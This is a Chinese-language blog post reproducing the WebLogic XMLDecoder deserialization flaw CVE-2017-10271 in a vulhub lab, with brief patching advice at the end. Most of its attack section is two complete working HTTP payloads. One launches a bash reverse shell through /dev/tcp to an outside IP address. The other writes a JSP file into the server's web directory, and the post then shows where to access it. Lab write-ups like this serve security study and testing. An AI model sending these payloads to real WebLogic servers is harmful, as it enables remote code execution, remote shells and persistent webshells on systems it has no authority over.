# WebLogic（CVE-2017-10271） - 夜布多 - 博客园

> 原文：[`www.cnblogs.com/tac2664/p/14508783.html`](https://www.cnblogs.com/tac2664/p/14508783.html)

# 漏洞叙述

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

# 影响版本

OracleWebLogic Server10.3.6.0.0
OracleWebLogic Server12.1.3.0.0
OracleWebLogic Server12.2.1.1.0
OracleWebLogic Server12.2.1.2.0

# 漏洞复现

我使用的是 vulhub+docker 搭建的环境。

访问 http://your-ip:7001/即可看到一个 404 页面，说明 weblogic 已成功启动

 ![](img/314eef39165f8d6eb9d58f49cfd15311.png)

##  getshell POC:

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope color: rgba(0, 128, 0, 1); text-decoration: underline">http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext color: rgba(0, 128, 0, 1); text-decoration: underline">http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

## nc 反弹

![](img/af0746baddd78ee8ceeb73bb7b78ebfb.png)

 ![](img/3693731a27592ef628936b985314dada.png)

 反弹成功。

## 写入 webshell

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate
Accept: */* Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope color: rgba(0, 128, 0, 1); text-decoration: underline">http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext color: rgba(0, 128, 0, 1); text-decoration: underline">http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

![](img/1c969a9580b5c8c2103c665647cc07d7.png)

 访问 shell

```
http://192.168.6.130:7001/bea_wls_internal/test.jsp
```

![](img/03bd322214c5cf29897b53be1c2f7996.png)

 成功写入。

# 修复建议

 Oracle 下载相关 10271 补丁，下载地址如下[`www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html`](http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html)；

  根据实际环境路径，删除 WebLogicwls-wsat 组件；删除相关文件后重启 weblogic，保证访问[wls-wsat/](http://link.zhihu.com/?target=http%3A//weblogic_ip/wls-wsat/) 提示 404 错误；

针对该漏洞被恶意利用的单位可查看如下如下路径进行日志查看，具体的路径根据实际安装情况进行查看：

xx:\xx\Middleware\user_projects\domains\base_domain\servers\AdminServer\logs